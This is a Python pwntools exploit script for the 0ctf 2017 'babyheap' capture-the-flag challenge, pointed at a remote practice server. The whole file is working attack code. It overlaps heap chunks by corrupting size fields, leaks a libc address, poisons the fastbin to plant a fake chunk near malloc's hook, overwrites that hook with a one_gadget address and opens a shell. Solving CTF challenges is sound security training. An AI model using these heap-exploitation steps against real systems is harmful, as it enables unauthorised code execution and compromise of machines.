#+++++++++++++++++++0ctf_2017_babyheap.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sat Oct 24 18:17:14 CST 2020
#+++++++++++++++++++0ctf_2017_babyheap.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./0ctf_2017_babyheap')

#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def add(size):
	sh.sendlineafter('Command: ','1')
	sh.sendlineafter('Size: ',str(size))

def fill(index,size,cont):	
	sh.sendlineafter('Command: ','2')
	sh.sendlineafter('Index: ',str(index))
	sh.sendlineafter('Size: ',str(size))
	sh.sendlineafter('Content: ',str(cont))

def delete(index):
	sh.sendlineafter('Command: ','3')
	sh.sendlineafter('Index: ',str(index))

def show(index):
	sh.sendlineafter('Command: ','4')
	sh.sendlineafter('Index: ',str(index))

sh = process('./0ctf_2017_babyheap')
sh = remote('node3.buuoj.cn',28037)

add(0x10) #0
add(0x10) #1
add(0x90) #2
#gdb.attach(sh,'b*$rebase(0x0DCC)') #calloc
add(0x10) #3
add(0x60) #4
 
payload1 = p64(0) + p64(0x21)
fill(2,0x10,payload1)

payload2 = 'A'*0x10
payload2 += 'A'*0x8 + p64(0x31)
fill(0,0x20,payload2)

delete(1)
add(0x28)

payload3 = 'A'*0x10
payload3 += 'A'*8 + p64(0xa1)
payload3 += 'A'*0x8
fill(1,0x28,payload3)
delete(2)
#gdb.attach(sh,'b*$rebase(0x0000000000000F43)') #read2num
fill(1,0x20,'A'*0x20)
show(1)
sh.recv(0x2a)
libc_addr = u64(sh.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.success("libc_addr====>" + str(hex(libc_addr)))

fill(1,0x20,'A'*0x18+p64(0xa1))  #prevent crashing

gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
gadget_addr = libc_addr + gadget[1]
log.success("gadget_addr====>" + str(hex(gadget_addr)))
fake_chunk_addr = libc_addr + 0x3c4aed
offset = 0x13
log.success("fake_chunk_addr====>"+str(hex(fake_chunk_addr)))

delete(4)
payload = 'A'*0x18 + p64(0x71)
payload += p64(fake_chunk_addr) 
fill(3,0x28,payload)

add(0x60) #5
#gdb.attach(sh,'b*$rebase(0x0000000000000DCC)')
add(0x60) #6
attack = 'A'*offset + p64(gadget_addr)
#gdb.attach(sh,'b*$rebase(0x0000000000000F43)')
fill(4,len(attack),attack)

add(0x10)

sh.interactive()
